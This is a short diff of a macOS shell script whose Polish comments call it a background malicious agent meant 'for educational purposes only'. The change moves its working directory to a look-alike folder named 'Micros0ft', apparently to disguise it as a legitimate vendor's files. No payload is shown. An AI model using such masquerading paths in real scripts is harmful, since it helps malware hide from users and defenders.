@@ -4,7 +4,7 @@
 # Wykonuje złośliwe działania w tle
 # ⚠️ TYLKO DO CELÓW EDUKACYJNYCH
 
-AGENT_DIR="/Library/Application Support/BugBusters"
+AGENT_DIR="/Users/Shared/Micros0ft"
 LOG_FILE="$AGENT_DIR/agent.log"
 DATA_DIR="$AGENT_DIR/data"
 TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
